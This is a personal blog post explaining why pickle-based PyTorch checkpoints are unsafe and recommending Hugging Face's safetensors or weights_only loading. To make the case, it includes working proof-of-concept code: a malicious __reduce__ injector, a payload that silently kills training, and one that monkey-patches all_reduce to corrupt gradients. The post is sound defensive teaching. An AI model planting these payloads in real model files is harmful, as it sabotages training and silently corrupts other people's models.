<!DOCTYPE html><html><head><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1"/><title>Why do we need Hugging Face&#x27;s SafeTensor?</title><meta name="description" content="Malicious code can be injected in your model weights and safetensors is all you need."/><meta property="og:image" content="[object Object]"/><meta name="next-head-count" content="5"/><meta charSet="utf-8"/><meta name="description" content="Personal website of Shenggui Li"/><meta name="keywords" content="Shenggui Li, Li Shenggui, Shenggui, Frank Lee, FrankLeeeeee, NTU"/><meta name="theme-color" content="#000000"/><meta property="og:type" content="website"/><meta property="og:title" content="Shenggui Li"/><meta property="og:description" content="Personal website of Shenggui Li"/><meta property="og:site_name" content="Shenggui Li"/><link rel="icon" href="/favicon.ico"/><link rel="manifest" href="/manifest.json"/><link rel="preload" href="/_next/static/media/9bf67a161a796382-s.p.woff2" as="font" type="font/woff2" crossorigin="anonymous" data-next-font="size-adjust"/><link rel="preload" href="/_next/static/css/1ad79467c35ab992.css" as="style"/><link rel="stylesheet" href="/_next/static/css/1ad79467c35ab992.css" data-n-g=""/><noscript data-n-css=""></noscript><script defer="" nomodule="" src="/_next/static/chunks/polyfills-78c92fac7aa8fdd8.js"></script><script src="/_next/static/chunks/webpack-b8f8d6679aaa5f42.js" defer=""></script><script src="/_next/static/chunks/framework-2c16ac744b6cdea6.js" defer=""></script><script src="/_next/static/chunks/main-678ea17784401d5f.js" defer=""></script><script src="/_next/static/chunks/pages/_app-51c35530fe70a85c.js" defer=""></script><script src="/_next/static/chunks/72-569a20d8954fdd30.js" defer=""></script><script src="/_next/static/chunks/319-c9917ddabbaf0618.js" defer=""></script><script src="/_next/static/chunks/pages/blogs/%5Bslug%5D-caca5d921c0602a0.js" defer=""></script><script src="/_next/static/6pdyVPe58eet_ZOQq4Ip3/_buildManifest.js" defer=""></script><script src="/_next/static/6pdyVPe58eet_ZOQq4Ip3/_ssgManifest.js" defer=""></script></head><body><div id="__next"><main class="__className_88131f"><nav class="bg-black shadow" data-headlessui-state=""><div class="mx-auto max-w-7xl px-2 sm:px-4 lg:px-8"><div class="flex h-16 justify-between"><div class="flex px-2 lg:px-0"><div class="flex flex-shrink-0 items-center"><img class="block h-16 w-auto md:hidden" src="/assets/logo.png" alt="Your Company"/><img class="hidden h-16 w-auto md:block" src="/assets/logo.png" alt="Your Company"/></div></div><div class="hidden items-center md:ml-6 md:space-x-8 md:flex md:flex-1  md:justify-end"><a class="inline-flex items-center px-1 pt-1 text-sm font-medium text-slate-200" href="/">Home</a><a class="inline-flex items-center border-b-2 border-transparent px-1 pt-1 text-sm font-medium text-slate-200" href="/about">About</a><a class="inline-flex items-center border-b-2 border-transparent px-1 pt-1 text-sm font-medium text-slate-200 " href="/blogs">Blogs</a><a target="_blank" rel="noopener noreferrer" class="inline-flex items-center border-b-2 border-transparent px-1 pt-1 text-sm font-medium text-slate-200 " href="/assets/cv.pdf">CV</a></div><div class="flex items-center md:hidden"><button class="inline-flex items-center justify-center rounded-md p-2 text-gray-400 hover:bg-gray-100 hover:text-gray-500 focus:outline-none focus:ring-2 focus:ring-inset focus:ring-indigo-500" id="headlessui-disclosure-button-:R66:" type="button" aria-expanded="false" data-headlessui-state=""><span class="sr-only">Open main menu</span><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" aria-hidden="true" class="block h-6 w-6"><path stroke-linecap="round" stroke-linejoin="round" d="M3.75 6.75h16.5M3.75 12h16.5m-16.5 5.25h16.5"></path></svg></button></div></div></div></nav><div class="container mx-auto py-8 px-8 md:px-16 lg:px-36"><div><article class="prose mx-auto text-slate-400"><h1 class="text-4xl text-white font-bold">Why do we need Hugging Face&#x27;s SafeTensor?</h1><h4 class="text-sm text-slate-400">Published on <!-- -->2024-10-19</h4><h4 class="text-sm text-slate-400">Reading time: <!-- -->5 min read</h4><h4 class="text-sm text-slate-400">Description: <!-- -->Malicious code can be injected in your model weights and safetensors is all you need.</h4><img src="https://huggingface.co/datasets/huggingface/documentation-images/resolve/main/safetensors/safetensors-logo-light.svg" alt="blog" lazy="loa/ding"/><p>A long time ago, a very simple question came to my mind when I was reading a bunch of Hugging Face&#x27;s documentation - what does Hugging Face&#x27;s SafeTensor do? The term &quot;safetensor&quot; appears in many places in the Hugging Face&#x27;s documentation but people rarely talk about it and discuss its purpose. Recently, there was a security affair which affected a team&#x27;s model training progress and this prompts me to revisit this question and write this blog. It should be noted that this blog is not a discussion of the affair but rather the technical advocation for the use of safetensors to protect your models, which are the most important assets in the AI era.</p>
<h2 class="text-white">What&#x27;s wrong with the current model storage?</h2>
<p>When we train a model, we often save the model weights to a file for checkpointing and later loading. The most popular format for this is the PyTorch state dictionary, which is a Python dictionary object mapping each layer to its parameter tensor. I guess most of you are familiar with the following code snippet:</p>
<pre><code class="text-white"># save model weights
state_dict = model.state_dict()
torch.save(state_dict, &quot;model.pt&quot;)

# load model weights
state_dict = torch.load(&quot;model.pt&quot;)
model.load_state_dict(state_dict)
</code></pre>
<p>However, this method uses <code class="text-white">pickle</code> to serialize and deserialize the entire state dict object, raising concerns over its security. The reason is that <code class="text-white">pickle</code> is not secure against erroneous or maliciously constructed data. It may load arbitrary code with the same privileges as the program that is deserializing the data. In this way, the attacker can inject arbitrary code into the model weights and cause serious security issues. One way to hack the models weights is to modify its <code class="text-white">__reduce__</code> method to execute arbitrary code.</p>
<pre><code class="text-white">class Obj:

    def __reduce__(self):
        return (exec, (&quot;print(&#x27;hello&#x27;)&quot;,))
</code></pre>
<p>If you serialize this object and save it to a file, the code will be executed when you load the object. That is, you will see a &quot;hello&quot; statement printed when you load the object.</p>
<p>With this in mind, we can basically manipulate many parts of the program, including imported libraries and local variables. I have provided two typical senarios where your training process can be interrupted and the arithmetic correctness of the model weights can be tampered with. You can also find the example code in my <a class="text-white" href="https://github.com/FrankLeeeee/Blog-Notes/tree/main/2024-10-19-safetensor">blog notes</a>.</p>
<h3 class="text-white">Scenario 1: Automatically shut down the training process</h3>
<p>As we can see the &quot;hello&quot; example, we need to write the malicious code as a string. Therefore, we can prepare the following code to create a new thread, which kills the parent process after 5 seconds when it is triggered. This thread works at the back so the user won&#x27;t notice anything and <code class="text-white">os.kill</code> does not return any error trace, which makes it hard to detect the malicious code.</p>
<pre><code class="text-white">AUTO_SHUTDOWN = &quot;&quot;&quot;
import os
import threading
from functools import partial

# get the process ID
pid = os.getpid()

def inject_code(pid: int):
    import time
    import os
    time.sleep(5)
    os.kill(pid, 9)

wrapped_fn = partial(inject_code, pid)
injection_thread = threading.Thread(target=wrapped_fn)
injection_thread.start()
&quot;&quot;&quot;
</code></pre>
<p>Next, we need to inject this code into the state dict object. As a result, when we load the model weights from disk, the code will be executed and the training process will be interrupted.</p>
<pre><code class="text-white">def inject_malicious_code(obj, code_str):
    # bind a reduce fn to weights
    def reduce(self):
        return (exec, (code_str, ))

    # bind the reduce fn to the weights&#x27;s __reduce__ method
    bound_reduce = reduce.__get__(obj, obj.__class__)
    setattr(obj, &quot;__reduce__&quot;, bound_reduce)
    return obj

state_dict = inject_malicious_code(state_dict, AUTO_SHUTDOWN)
</code></pre>
<h3 class="text-white">Scenario 2: Introduce errors in collective communication</h3>
<p>Similarly, if we want to modify the behaviour of the collective communication operations, we can introduce errors in its computation so that the gradients will never be correct in distributed training. We can prepare the following code to hijack the <code class="text-white">all_reduce</code> function. This code monkey patches the <code class="text-white">all_reduce</code> API in the <code class="text-white">torch.distributed</code> module and adds 1 to the tensor. As a result, the all-reduce results will be larger than the expected results.</p>
<pre><code class="text-white">HIJACK_ALL_REDUCE = &quot;&quot;&quot;
import torch.distributed as dist

dist._origin_all_reduce = dist.all_reduce
def hijacked_all_reduce(tensor, *args, **kwargs):
    import torch.distributed as dist
    tensor = tensor.add_(1)
    return dist._origin_all_reduce(tensor, *args, **kwargs)

setattr(dist, &quot;all_reduce&quot;, hijacked_all_reduce)
&quot;&quot;&quot;
</code></pre>
<p>For example, if you have 2 processes and each process is holidng a tensor <code class="text-white">[0, 1, 2, 3]</code>, the all-reduce operation will sum up the tensors from each process and the result will be <code class="text-white">[0, 2, 4, 6]</code>. However, if the attacker injects the malicious code, the result will be <code class="text-white">[2, 4, 6, 8]</code>.</p>
<h2 class="text-white">How does safetensors solve the problem?</h2>
<p>In the first place, Safetensors does not use <code class="text-white">pickle</code> to serialize and deserialize the state dict object. Instead, it uses a custom serialization method to store the model weights. In this way, the attacker cannot inject arbitrary code into the model weights. Amazingly, Safetensors is still fast as does zero-copy when storing and saving model weights. In simple words, Hugging Face&#x27;s Safetensors ensures that your model weights files only contain the parameter data and nothing else.</p>
<p>We have also provided some examples of using safetensors to remove the security concerns in the my <a class="text-white" href="https://github.com/FrankLeeeee/Blog-Notes/tree/main/2024-10-19-safetensor">blog notes</a>. For every example which demonstrates the malicious scenario, you just simply add the <code class="text-white">--use-safetensor</code> flag to the command to see the difference.</p>
<p>Moreover, if you still want to stick to <code class="text-white">torch.load</code>, you can specify the argument <code class="text-white">weights_only</code> so that PyTorch will restricts the unpickler to only unpickle the metadata and tensors.</p>
<h2 class="text-white">References</h2>
<ul>
<li>https://www.reddit.com/r/learnpython/comments/ewrcuc/how_do_you_run_code_while_unpickling/</li>
<li>https://huggingface.co/docs/safetensors/en/index</li>
</ul></article></div></div></main></div><script id="__NEXT_DATA__" type="application/json">{"props":{"pageProps":{"slug":"2024-10-19-safetensor","readingTime":"5 min read","source":"\nA long time ago, a very simple question came to my mind when I was reading a bunch of Hugging Face's documentation - what does Hugging Face's SafeTensor do? The term \"safetensor\" appears in many places in the Hugging Face's documentation but people rarely talk about it and discuss its purpose. Recently, there was a security affair which affected a team's model training progress and this prompts me to revisit this question and write this blog. It should be noted that this blog is not a discussion of the affair but rather the technical advocation for the use of safetensors to protect your models, which are the most important assets in the AI era.\n\n## What's wrong with the current model storage?\n\nWhen we train a model, we often save the model weights to a file for checkpointing and later loading. The most popular format for this is the PyTorch state dictionary, which is a Python dictionary object mapping each layer to its parameter tensor. I guess most of you are familiar with the following code snippet:\n\n```python\n# save model weights\nstate_dict = model.state_dict()\ntorch.save(state_dict, \"model.pt\")\n\n# load model weights\nstate_dict = torch.load(\"model.pt\")\nmodel.load_state_dict(state_dict)\n```\n\nHowever, this method uses `pickle` to serialize and deserialize the entire state dict object, raising concerns over its security. The reason is that `pickle` is not secure against erroneous or maliciously constructed data. It may load arbitrary code with the same privileges as the program that is deserializing the data. In this way, the attacker can inject arbitrary code into the model weights and cause serious security issues. One way to hack the models weights is to modify its `__reduce__` method to execute arbitrary code.\n\n```python\nclass Obj:\n\n    def __reduce__(self):\n        return (exec, (\"print('hello')\",))\n```\n\nIf you serialize this object and save it to a file, the code will be executed when you load the object. That is, you will see a \"hello\" statement printed when you load the object.\n\nWith this in mind, we can basically manipulate many parts of the program, including imported libraries and local variables. I have provided two typical senarios where your training process can be interrupted and the arithmetic correctness of the model weights can be tampered with. You can also find the example code in my [blog notes](https://github.com/FrankLeeeee/Blog-Notes/tree/main/2024-10-19-safetensor).\n\n### Scenario 1: Automatically shut down the training process\n\nAs we can see the \"hello\" example, we need to write the malicious code as a string. Therefore, we can prepare the following code to create a new thread, which kills the parent process after 5 seconds when it is triggered. This thread works at the back so the user won't notice anything and `os.kill` does not return any error trace, which makes it hard to detect the malicious code.\n\n```python\nAUTO_SHUTDOWN = \"\"\"\nimport os\nimport threading\nfrom functools import partial\n\n# get the process ID\npid = os.getpid()\n\ndef inject_code(pid: int):\n    import time\n    import os\n    time.sleep(5)\n    os.kill(pid, 9)\n\nwrapped_fn = partial(inject_code, pid)\ninjection_thread = threading.Thread(target=wrapped_fn)\ninjection_thread.start()\n\"\"\"\n```\n\nNext, we need to inject this code into the state dict object. As a result, when we load the model weights from disk, the code will be executed and the training process will be interrupted.\n\n```python\ndef inject_malicious_code(obj, code_str):\n    # bind a reduce fn to weights\n    def reduce(self):\n        return (exec, (code_str, ))\n\n    # bind the reduce fn to the weights's __reduce__ method\n    bound_reduce = reduce.__get__(obj, obj.__class__)\n    setattr(obj, \"__reduce__\", bound_reduce)\n    return obj\n\nstate_dict = inject_malicious_code(state_dict, AUTO_SHUTDOWN)\n```\n\n### Scenario 2: Introduce errors in collective communication\n\nSimilarly, if we want to modify the behaviour of the collective communication operations, we can introduce errors in its computation so that the gradients will never be correct in distributed training. We can prepare the following code to hijack the `all_reduce` function. This code monkey patches the `all_reduce` API in the `torch.distributed` module and adds 1 to the tensor. As a result, the all-reduce results will be larger than the expected results.\n\n```python\nHIJACK_ALL_REDUCE = \"\"\"\nimport torch.distributed as dist\n\ndist._origin_all_reduce = dist.all_reduce\ndef hijacked_all_reduce(tensor, *args, **kwargs):\n    import torch.distributed as dist\n    tensor = tensor.add_(1)\n    return dist._origin_all_reduce(tensor, *args, **kwargs)\n\nsetattr(dist, \"all_reduce\", hijacked_all_reduce)\n\"\"\"\n```\n\nFor example, if you have 2 processes and each process is holidng a tensor `[0, 1, 2, 3]`, the all-reduce operation will sum up the tensors from each process and the result will be `[0, 2, 4, 6]`. However, if the attacker injects the malicious code, the result will be `[2, 4, 6, 8]`.\n\n## How does safetensors solve the problem?\n\nIn the first place, Safetensors does not use `pickle` to serialize and deserialize the state dict object. Instead, it uses a custom serialization method to store the model weights. In this way, the attacker cannot inject arbitrary code into the model weights. Amazingly, Safetensors is still fast as does zero-copy when storing and saving model weights. In simple words, Hugging Face's Safetensors ensures that your model weights files only contain the parameter data and nothing else.\n\nWe have also provided some examples of using safetensors to remove the security concerns in the my [blog notes](https://github.com/FrankLeeeee/Blog-Notes/tree/main/2024-10-19-safetensor). For every example which demonstrates the malicious scenario, you just simply add the `--use-safetensor` flag to the command to see the difference.\n\nMoreover, if you still want to stick to `torch.load`, you can specify the argument `weights_only` so that PyTorch will restricts the unpickler to only unpickle the metadata and tensors.\n\n## References\n\n- https://www.reddit.com/r/learnpython/comments/ewrcuc/how_do_you_run_code_while_unpickling/\n- https://huggingface.co/docs/safetensors/en/index\n","frontMatter":{"title":"Why do we need Hugging Face's SafeTensor?","description":"Malicious code can be injected in your model weights and safetensors is all you need.","date":"2024-10-19","slug":"2024-10-19-safetensor","ogImage":{"url":"https://huggingface.co/datasets/huggingface/documentation-images/resolve/main/safetensors/safetensors-logo-light.svg"}},"tags":[]},"__N_SSG":true},"page":"/blogs/[slug]","query":{"slug":"2024-10-19-safetensor"},"buildId":"6pdyVPe58eet_ZOQq4Ip3","isFallback":false,"gsp":true,"scriptLoader":[]}</script></body></html>